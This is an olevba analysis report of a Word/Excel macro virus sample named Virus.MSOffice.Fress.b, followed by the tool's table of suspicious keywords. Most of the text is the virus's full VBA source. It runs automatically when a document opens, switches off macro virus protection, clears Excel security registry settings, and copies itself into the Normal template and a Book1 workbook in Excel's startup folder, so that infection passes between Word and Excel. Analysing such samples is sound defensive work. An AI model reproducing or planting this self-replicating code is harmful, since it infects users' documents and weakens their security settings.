olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Fress.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSOffice.Fress.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'***

Sub Start()
    On Error Resume Next
If IsObject(WScript) Then
'        Set WordObj = GetObject(, "Word.Application")
 '      If WordObj = "" Then Set WordObj = CreateObject("Word.Application"):FlagUnload = True
  '     Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
   '    NT.DeleteLines 1, NT.CountOfLines: NT.AddFromFile (WScript.ScriptFullName)
    '    if FlagUnload = True then Wordobj.quit
     '   Set NT = Nothing: Set WordObj = Nothing

    Set xlApp = CreateObject("Excel.Application")
    Set FSO = CreateObject("Scripting.FileSystemObject")
MsgBox "1"
    If Not FSO.FileExists(xlApp.Application.StartupPath + "\Book1.") Then
MsgBox "2"
    Set Book1Obj = xlApp.Workbooks.Add: Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.AddFromFile (WScript.ScriptFullName)
MsgBox "3"
    Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
MsgBox "4"
    End If
    xlApp.Quit: Set FSO = Nothing
End If
MsgBox "@"
End Sub
Private Sub Document_Open()
    On Error Resume Next
    Application.Options.VirusProtection = False: Application.Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
    Set AD = Application.ActiveDocument.VBProject.VBComponents(1).CodeModule: Set NT = Application.NormalTemplate.VBProject.VBComponents(1).CodeModule
    If InStr(NT.Lines(1, 1), "***") = 0 Then
        NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
    ElseIf InStr(AD.Lines(1, 1), "***") = 0 Then
        AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
    End If
    Set xlApp = CreateObject("Excel.Application")
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
    Set FSO = CreateObject("Scripting.FileSystemObject")
    If Not FSO.FileExists(xlApp.Application.StartupPath + "\Book1.") Then
    Set Book1Obj = xlApp.Workbooks.Add: Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
    Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
    End If
    xlApp.Quit: Set FSO = Nothing
End Sub
Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set WordObj = GetObject(, "Word.Application")
    If WordObj = "" Then Set WordObj = CreateObject("Word.Application"): FlagUnload = True
    Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
    NT.DeleteLines 1, NT.CountOfLines: NT.InsertLines 1, TW.Lines(1, TW.CountOfLines)
    If FlagUnload = True Then WordObj.Quit
    Set NT = Nothing: Set WordObj = Nothing
    Set xlApp = CreateObject("Excel.Application")
    Set FSO = CreateObject("Scripting.FileSystemObject")
    If Not FSO.FileExists(xlApp.Application.StartupPath + "\Book1.") Then
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountOfLines)
        Book1Obj.SaveAs Application.StartupPath & "\Book1.", xlNormal, , , , , , , False
        xlApp.Quit: Set FSO = Nothing
    End If
    If InStr(AW.Lines(1, 1), "***") = 0 Then AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

